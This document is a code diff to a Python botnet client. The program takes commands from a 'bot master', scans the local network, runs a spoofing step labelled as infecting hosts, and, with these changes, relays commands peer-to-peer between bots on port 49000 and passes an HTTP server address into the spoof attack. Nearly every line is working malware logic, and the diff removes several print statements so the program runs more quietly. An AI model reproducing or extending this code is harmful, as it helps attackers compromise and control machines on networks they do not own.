@@ -22,7 +22,7 @@ def convert(choice):
 
 
 # handles all the commands
-def handle_command(data, clients):
+def handle_command(data, clients, srv):
     if data == "scan":
         parent_conn.send(data)
         clients = parent_conn.recv()
@@ -52,6 +52,7 @@ def handle_command(data, clients):
         parent_conn.send(data)
         parent_conn.send(chosen_ip)
         parent_conn.send(chosen_mac)
+        parent_conn.send(srv)
         result = parent_conn.recv()
         choice = "spoof_result"
         return result, choice
@@ -63,28 +64,27 @@ def handle_command(data, clients):
 
 # handles all the command's results (sends back to the bot master)
 def handle_command_result(sock, data, output):
+    global messages
     if data == "scan_result":
         if output:
             string = "IP" + " " * 15 + "MAC"
             for client in output:
                 string += "\n" "{}   {}".format(client['ip'], client['mac'])
-            print(string)
-            sock.send(string.encode())
+            messages = string
         else:
-            sock.send("scan failed".encode())
+            messages = "scan failed"
 
     elif data == "scan_result:":
-        sock.send(output.encode())
+        messages = output
 
     elif data == "spoof_result":
-        print("infected")
+        pass
 
     elif data == "tree_result":
         hosts = ""
         for host in output:
             hosts += host + " "
-        print(hosts)
-        sock.send(hosts.encode())
+        messages = hosts
 
 
 # sends to the entire network message to check for other bots
@@ -131,37 +131,97 @@ def ip_list():
 
 
 def con_thread(sock, addr):
+    global messages
     choice = ""
     data = ""
     output = ""
     clients = []
+    full_cmd = ""
+    fc = ""
+    cip = ""
+    forward = False
+    http_srv = ""
     while True:
+        forward = False
         if choice == "":
             choice = sock.recv(1024).decode()
+            fc = choice
 
-        data = choice
-        data_type = convert(choice)
-        choice = ""
+        if choice.find("-") != -1:
+            if len(choice.split("-")) == 2:
+                cip = choice.split("-")[1]
+                choice = choice.split("-")[0]
+                if cip != ip:
+                    forward = True
+                    messages = fc
+            elif len(choice.split("-")) == 3:
+                http_srv = choice.split("-")[2]
+                cip = choice.split("-")[1]
+                choice = choice.split("-")[0]
+                if cip != ip:
+                    forward = True
+                    messages = fc
 
-        if not data_type:
-            print("invalid instruction")
+        if not forward:
+            data = choice
+            data_type = convert(choice)
+            choice = ""
+            print(data_type)
+            print(data)
 
-        else:
-            if data_type == Types.COMMAND:
-                output, choice = handle_command(data, clients)
-            elif data_type == Types.COMMAND_RESULT:
-                handle_command_result(sock, data, output)
+            if not data_type:
+                pass
+
+            else:
+                if data_type == Types.COMMAND:
+                    output, choice = handle_command(data, clients, http_srv)
+                elif data_type == Types.COMMAND_RESULT:
+                    handle_command_result(sock, data, output)
+
+
+def clients():
+    while True:
+        for host in lan_tree:
+            if len(connections) != 3 and host != ip and host not in connections:
+                nc = threading.Thread(target=new_conn, args=(host,))
+                nc.start()
+                connections.append(host)
+
+
+def new_conn(host):
+    client_tcp = socket.socket()
+    last_msg = ""
+    try:
+        client_tcp.connect((host, 49000))
+        print("connected to " + host)
+        connections.append(host)
+    except:
+        return
+    while True:
+        if messages:
+            msg = messages
+            if last_msg != msg:
+                last_msg = msg
+
+                client_tcp.send(msg.encode())
+                time.sleep(10)
+            else:
+                time.sleep(10)
 
 
 if __name__ == '__main__':
+    multiprocessing.freeze_support()
     # get ip
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
     ip = s.getsockname()[0]
     s.close()
 
+    messages = ""
     ips = ip_list()
     lan_tree = []
+    connections = []
+    server_tcp = socket.socket()
 
     send_thread = threading.Thread(target=send_to_network)
     recv_thread = threading.Thread(target=recv_replies)
@@ -178,17 +238,17 @@ if __name__ == '__main__':
         p1.start()
         can_infect = True
     except Exception as ex:
-        print(ex)
+        pass
 
-    if can_infect:
-        print("can_infect")
+    clns = threading.Thread(target=clients)
+    clns.start()
 
-    tcp_socket = socket.socket()
-    tcp_socket.bind(("0.0.0.0", 49000))
-    tcp_socket.listen()
+    server_tcp.bind(("0.0.0.0", 49000))
+    server_tcp.listen()
 
     # waiting for command (later receives from bot master)
     while True:
-        (client_socket, client_address) = tcp_socket.accept()
+        (client_socket, client_address) = server_tcp.accept()
+        print(client_address)
         con_th = threading.Thread(target=con_thread, args=(client_socket, client_address,))
         con_th.start()
